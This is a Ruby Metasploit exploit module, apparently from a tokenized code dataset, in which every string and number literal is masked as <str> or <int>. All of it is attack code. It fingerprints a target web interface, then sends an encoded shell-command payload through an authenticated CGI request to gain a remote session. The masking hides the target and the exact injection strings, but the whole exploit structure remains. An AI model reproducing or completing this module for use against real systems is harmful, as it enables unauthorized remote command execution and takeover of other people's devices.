require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > ARCH_CMD , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > true , <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > [ [ <str> , { <str> = > true } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptBool . new ( <str> , [ true , <str> , true ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def check vprint_status ( <str> ) begin res = send_request_cgi ( { <str> = > <str> } ) if res and res . code == <int> and res . body =~ <str> return Exploit :: CheckCode :: Appears elsif res and res . code == <int> and res . body =~ <str> return Exploit :: CheckCode :: Detected end rescue :: Rex :: ConnectionRefused , :: Rex :: HostUnreachable , :: Rex :: ConnectionTimeout vprint_error ( <str> ) return Exploit :: CheckCode :: Unknown end return Exploit :: CheckCode :: Safe end def on_new_session ( client ) client . shell_command_token ( <str> ) end def exploit user = datastore [ <str> ] pass = datastore [ <str> ] cmd = Rex :: Text . uri_encode ( <str> payload . raw <str> ) print_status ( <str> payload . raw . length <str> ) begin res = send_request_cgi ( { <str> = > <str> , <str> = > <str> user <str> pass <str> , <str> = > false , <str> = > { <str> = > <str> , <str> = > <str> cmd <str> } } , <int> ) rescue :: Rex :: ConnectionRefused , :: Rex :: HostUnreachable , :: Rex :: ConnectionTimeout fail_with ( Failure :: Unknown , <str> ) end if res and res . code == <int> and res . body =~ <str> print_good ( <str> ) elsif res and res . code == <int> and res . headers [ <str> ] =~ <str> fail_with ( Failure :: NoAccess , <str> ) else fail_with ( Failure :: Unknown , <str> ) end end end 
